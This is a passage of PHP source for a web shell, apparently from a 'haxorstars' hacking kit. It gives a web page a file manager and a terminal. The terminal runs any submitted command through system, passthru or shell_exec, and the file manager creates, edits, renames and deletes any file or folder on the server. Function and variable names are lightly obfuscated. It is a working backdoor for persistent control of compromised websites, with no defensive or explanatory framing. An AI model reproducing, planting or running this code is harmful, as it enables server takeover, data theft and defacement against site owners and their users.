            $cr_ea_teF_old_er = "mk"."d"."ir";
            if (!is_dir($fo_lde_rna_me)) {
            if ($cr_ea_teF_old_er($fo_lde_rna_me)) {
                echo '
                <script>
                    alert("Success Create Folder")
                    history.back()
                    history.back()
                </script>';
            } else {
                echo '
                <script>
                    alert("Failed to Create Folder")
                    history.back()
                </script>
            ';
            }
            } else {
                echo '
                <script>
                    alert("'.$fo_lde_rna_me.' Already Exists")
                    history.back()
                </script>
            ';
            }
        }
        echo '<form class="mx-2 my-2" action="" method="POST">';
        echo '<label class="block">
            <span class="block '.$txtBlue.'">New Folder</span>
            <input type=""text" class="bg-white '.$txtBlack.' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 placeholder:text-gray-600 shadow-sm" placeholder="New Folder" name="newfoldername">
            </label>';
        echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
        echo '<button type="submit" name="btn-newfolder" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Create</button>';
        echo '</form>';
    }
    if (isset($_GET['newfiles'])) {
        if (isset($_POST['btn-newfiles'])) {
            $fi_len_a_me = $_POST['newfilesname'];
            $fi_lec_ont_ent = $_POST['contentfile'];
            if (!is_file($fi_len_a_me)) {
            $o_pe_nF_ile = fopen("$fi_len_a_me", "w");
            if ($fi_lec_ont_ent) {
                $cr_eat_eFi_le = fwrite($o_pe_nF_ile, $fi_lec_ont_ent);
            } else {
                $cr_eat_eFi_le = $o_pe_nF_ile;
            }
                if ($cr_eat_eFi_le) {
                    echo '
                        <script>
                            alert("Success Create File")
                            history.back()
                            history.back()
                        </script>';
                } else {
                    echo '
                    <script>
                        alert("Failed to Create File")
                        history.back()
                    </script>
                ';
                }
            } else {
                echo '
                <script>
                    alert("'.$fi_len_a_me.' Already Exists")
                    history.back()
                </script>
                ';
            }
        }
        echo '<form class="mx-2 my-2" action="" method="POST">';
        echo '<label class="block">
            <span class="block '.$txtBlue.'">New Files</span>
            <input type=""text" class="bg-white '.$txtBlack.' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 placeholder:text-gray-600 shadow-sm" placeholder="NewFiles.txt" name="newfilesname">
            </label>';
        echo '<textarea name="contentfile" id="contentfile" class="focus:shadow-soft-primary-outline min-h-unset fs-xs font-normal source-code-pro '.$txtYellow.' tracking-wider leading-5.6 ease-soft block h-96 w-4/5 appearance-none rounded-lg border border-solid border-gray-300 bg-slate-950 bg-clip-padding px-3 py-2 my-2 outline-none transition-all focus:border-fuchsia-300 focus:outline-none" placeholder:text-slate-200 placeholder="NuLz Was Here"></textarea>';
        echo '
        <script>
        var textarea = document.getElementById("contentfile");
        textarea.addEventListener("keydown", function(e) {
            if (e.key == "Tab") {
            e.preventDefault();
            var start = this.selectionStart;
            var end = this.selectionEnd;
            this.value = this.value.substring(0, start) + "\t" + this.value.substring(end);
            this.selectionStart =
                this.selectionEnd = start + 1;
            }
        });
        </script>
        ';
        echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
        echo '<button type="submit" name="btn-newfiles" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Create</button>';
        echo '</form>';
    }
    if (isset($_GET['command'])) {
        echo '<form class="mx-2 my-2" action="" method="POST">';
        echo '
        <div class="terminal">
        <div class="headerTerm">
            <img src="https://raw.githubusercontent.com/haxorstars/archive/main/media/terminal.png"
                alt="terminal" /><span>Terminal</span>
            <strong>Terminal</strong>
        </div>
        <div class="root" style="color: #d00c0c"></div>
        <div class="command">
            <form class="flex flex-col" action="" method="POST">
                <label for="cmd">root@haxorstars$</label>
                <input class="border-0 border-transparent hover:border-transparent active:border-transparent focus:outline-none focus:ring focus:ring-transparent" type="text" id="cmd" name="cmd">
                <textarea class="bg-transparent h-2/4 border-0 border-transparent hover:border-transparent active:border-transparent focus:outline-none focus:ring focus:ring-transparent" readonly>';
                $s_he_ll = ["system", "passthru", "shell_exec"];
				$chose = array_rand($s_he_ll);
				echo $s_he_ll[$chose]($_POST["cmd"]);
        echo '</textarea>
            </form>
        </div>
    </div>
        ';
        echo '</form>';
    }
    if (isset($_GET['editfile'])) {
        if (isset($_POST['btn-editedfile'])) {
            $fp = fopen($_GET['editfile'], 'w');
            if (fwrite($fp, $_POST['editedfile'])) {
            echo '
            <script>
                alert("Edit File Success")
                history.back()
                history.back()
            </script>';
            } else {
            echo '
            <script>
                alert("Edit File Failed!")
                history.back()
            </script>
            ';
            }
            fclose($fp);
            }
        echo '<form class="mx-2 my-2" action="" method="POST">';
        echo "<font class='".$txtSky."'>EDIT FILE => " . $path.basename($_GET['editfile']) . "</font>";
    	$content = htmlspecialchars(file_get_contents($_GET['editfile']));
        echo '<textarea name="editedfile" id="editedfile" class="focus:shadow-soft-primary-outline min-h-unset fs-xs font-normal source-code-pro '.$txtYellow.' tracking-wider leading-5.6 ease-soft block h-96 w-4/5 appearance-none rounded-lg border border-solid border-gray-300 bg-slate-950 bg-clip-padding px-3 py-2 outline-none transition-all focus:border-fuchsia-300 focus:outline-none">'.$content.'</textarea>';
        echo '
        <script>
        var textarea = document.getElementById("editedfile");
        textarea.addEventListener("keydown", function(e) {
            if (e.key == "Tab") {
            e.preventDefault();
            var start = this.selectionStart;
            var end = this.selectionEnd;
            this.value = this.value.substring(0, start) + "\t" + this.value.substring(end);
            this.selectionStart =
                this.selectionEnd = start + 1;
            }
        });
        </script>
        ';
        echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
        echo '<button type="submit" name="btn-editedfile" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Save</button>';
        echo '</form>';
        
    }
    if (isset($_GET['rename']) ) {
            if (isset($_POST['btn-rename'])) {
            if (rename($_GET['rename'], $path . '/' . $_POST['newname'])) {
            echo '
            <script>
                alert("Rename Success")
                history.back()
                history.back()
            </script>';
            } else {
            echo '
            <script>
                alert("Rename Failed!")
                history.back()
            </script>
            ';
            }
            $_GET['rename'] = $_POST['newname'];
            }
            echo '<form class="mx-2 my-2" action="" method="POST">';
            echo '<label class="block">
                <span class="block '.$txtBlue.'">RENAME FILE => '.$path.$_GET["rename"] . '</span>
                <input type=""text" class="bg-white '.$txtBlack.' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 shadow-sm" name="newname" value="'.$_GET["rename"].'">
                </label>';
            echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
            echo '<button type="submit" name="btn-rename" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Save</button>';
            echo '</form>';
    }
    if (isset($_GET['deletedir'])) {
            if (rmdir($_GET['deletedir'])) {
            echo '
            <script>
                alert("Delete Dir Success")
                history.back();
            </script>';
            } else {
            echo '
            <script>
                alert("Delete Dir Failed!")
                history.back()
            </script>
            ';
            }
    }
    if (isset($_GET['deletefile'])) {
            if (unlink($_GET['deletefile'])) {
            echo '
            <script>
                alert("Delete File Success")
                history.back();
            </script>';
            } else {
            echo '
            <script>
                alert("Delete File Failed!")
                history.back()
            </script>
            ';
            }
    }
        ?>
        <div class="container px-2 py-2 w-full">
            <?php
            $scan = scandir($path);
            ?>
            <table
                class="border-separate border-spacing-2 border border-slate-500 whitespace-nowrap w-full table-auto md:table-auto">
                <thead>
                    <tr>
                        <th class="border border-slate-600 <?= $txtWhite ?>">Name</th>
                        <th class="border border-slate-600 <?= $txtWhite ?>">Last Update</th>
                        <th class="border border-slate-600 <?= $txtWhite ?>">Size</th>
                        <th class="border border-slate-600 <?= $txtWhite ?>">Owner/Group</th>
                        <th class="border border-slate-600 <?= $txtWhite ?>">Permission</th>
                        <th class="border border-slate-600 <?= $txtWhite ?>">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    //DIR
                    foreach ($scan as $dir) {
                        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
                            continue;
                        echo "<tr>";
                        echo "<td class='whitespace-nowrap flex flex-row " . $txtOrange . "'><img src='".$folderIcon."'>&nbsp;<a class='font-bold " . $txtOrange . "' href=\"?path=$path/$dir\">$dir</a></td>";
                        echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "</center></td>";
                        echo "<td class='whitespace-nowrap " . $txtRose . "'><center>--DIR--</center></td>";
                        echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $user . "/" . $group . "</center></td>";
                        echo "<td class='whitespace-nowrap'><center>";
                        if (is_writable("$path/$dir"))
                            echo '<center><font class="' . $txtGreen . '">';
                        elseif (!is_readable("$path/$dir"))
                            echo '<font class="' . $txtRed . '">';
                            echo perms("$path/$dir");

                        if (is_writable("$path/$dir") || !is_readable("$path/$dir"))
                            echo '</font></center>';
                        echo "</td></center>";
                        echo "<td><center>";
                        ?>
                    <form class="whitespace-nowrap" action="?option&path=<?= $path ?>" method="POST">
                    <a href="?option&path=<?= $path ?>/&rename=<?=$dir?>"><button type="button" class="inline-flex items-center px-2 py-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-sky-200 dark:focus:ring-sky-900 hover:bg-sky-800"><i class="fa-solid fa-pen"></i></button></a>
                    <a href="?option&path=<?= $path ?>/&deletedir=<?=$dir?>"><button type="button" class="inline-flex items-center px-2 py-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-red-200 dark:focus:ring-red-900 hover:bg-red-800"><i class="fa-solid fa-trash"></i></button></a>
                    </form>
                    <?php
                        echo "</center></td>";
                    } 
                    //FILE
                    foreach ($scan as $file) {
                        if (!is_file("$path/$file"))
                            continue;
                        $size = filesize("$path/$file") / 1024;
                        $size = round($size, 3);
                        if ($size >= 1024) {
                            $size = round($size / 1024, 2) . ' MB';
                        } else {
                            $size = $size . ' KB';
                        }
                        echo "<tr>";
                        echo "<td class='whitespace-nowrap flex flex-row'><img src='".$filesIcon."'>&nbsp;<a class=\"$txtWhite\" href=\"?option&path=$path/&editfile=$file\">$file</a></td>";
                        echo "<td class='whitespace-nowrap w-auto px-12 " . $txtSky . "'><center>" . date("d-M-Y H:i", filemtime("$path/$file")) . "</center></td>";
                        echo "<td class='whitespace-nowrap " . $txtRose . "'><center>" . $size . "</center></td>";
                        echo "<td class='whitespace-nowrap " . $txtEmerald . "'><center>" . $user . "/" . $group . "</center></td>";
                        echo "<td class='whitespace-nowrap'><center>";
                        if (is_writable("$path/$file"))
                            echo '<font class="' . $txtGreen . '">';
                        elseif (!is_readable("$path/$file"))
                            echo '<font class="' . $txtRed . '">';
                            echo perms("$path/$file");
                        if (is_writable("$path/$file") || !is_readable("$path/$file"))
                            echo '</font>';
                            echo "</center></td>";
                        echo "<td><center>";
                        ?>
                    <a href="?option&path=<?= $path ?>/&editfile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-emerald-200 dark:focus:ring-emerald-900 hover:bg-emerald-800"><i class="fa-solid fa-file-pen"></i></button></a>
                    <a href="?option&path=<?= $path ?>/&rename=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-sky-200 dark:focus:ring-sky-900 hover:bg-sky-800"><i class="fa-solid fa-pen"></i></button></a>
                    <a href="?option&path=<?= $path ?>/&deletefile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-red-200 dark:focus:ring-red-900 hover:bg-red-800"><i class="fa-solid fa-trash"></i></button></a>
                    <?php echo "</center></td>"; } ?>
                </tbody>
            </table>
            <?php
        function perms($file)
        {
            $perms = fileperms($file);
            if (($perms & 0xC000) == 0xC000) {
                $info = 's';
            } elseif (($perms & 0xA000) == 0xA000) {
                $info = 'l';
            } elseif (($perms & 0x8000) == 0x8000) {
                $info = '-';
            } elseif (($perms & 0x6000) == 0x6000) {
                $info = 'b';
            } elseif (($perms & 0x4000) == 0x4000) {
                $info = 'd';
            } elseif (($perms & 0x2000) == 0x2000) {
                $info = 'c';
            } elseif (($perms & 0x1000) == 0x1000) {
                $info = 'p';
            } else {
                $info = 'u';
            }
            $info .= (($perms & 0x0100) ? 'r' : '-');
            $info .= (($perms & 0x0080) ? 'w' : '-');
            $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
            $info .= (($perms & 0x0020) ? 'r' : '-');
            $info .= (($perms & 0x0010) ? 'w' : '-');
            $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
            $info .= (($perms & 0x0004) ? 'r' : '-');
            $info .= (($perms & 0x0002) ? 'w' : '-');
            $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
            return $info;
        }
        ?>
        </div>
        <?=$shellFooter?>
</body>
</html>